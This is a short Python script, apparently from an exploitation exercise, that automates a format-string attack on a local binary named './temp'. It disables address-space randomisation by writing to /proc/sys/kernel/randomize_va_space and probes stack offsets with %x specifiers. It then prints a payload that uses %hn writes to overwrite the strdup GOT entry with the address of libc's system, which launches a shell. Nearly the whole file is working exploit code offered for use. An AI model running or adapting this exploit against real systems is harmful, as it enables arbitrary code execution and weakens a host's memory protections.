#! /usr/bin/env python

import subprocess
import struct
import re

# get with gdb
# if first two bytes are greater then second, prevent overflow with rollover (add 1 at the beginning)
libsystem_address_first_two = 0xb7e5
libsystem_address_second_two = 0x6360

# address of strdup
target_address = 0x80496f8
first_target_address_little_endian = struct.pack("<l", target_address)
second_target_address_little_endian = struct.pack("<l", (target_address + 2))

first_target_address_string = re.sub("'", "", repr(first_target_address_little_endian))
second_target_address_string = re.sub("'", "", repr(second_target_address_little_endian))

commandtoexec = "sh;#"
binary = "./temp"

# 8 bytes is the address..
already_written = len(commandtoexec) + 8

# calc how much has already been written for both jump to address tupels
jump_address_first_two = libsystem_address_second_two - already_written
jump_address_second_two = libsystem_address_first_two - libsystem_address_second_two

# important! Disable memory randomization
subprocess.Popen("echo 0 > /proc/sys/kernel/randomize_va_space", shell=True, stdout=subprocess.PIPE)

# i represents the offset (i and i+1)
for i in range(0, 200):
    toex = "env -i ./temp \"$(python -c 'import sys; sys.stdout.write(\"sh;#AAAABBBB%00000x%"
    toex += str(i) + "$hp%00000x%" + str(i + 1) + "$hp\")')\""

    output = str(i) + ": " + subprocess.Popen(toex, shell=True, stdout=subprocess.PIPE).stdout.read()
    
    if "0x41414141" in output and "0x42424242" in output:
        print("offsets: " + str(i) + ", " + str(i + 1))
        print "env -i " + binary + " \"$(python -c 'import sys; sys.stdout.write(\"" + commandtoexec + first_target_address_string + second_target_address_string + "%" + str(jump_address_first_two) + "x%" + str(i) + "$hn%" + str(jump_address_second_two) + "x%" + str(i + 1) + "$hn\")')\""
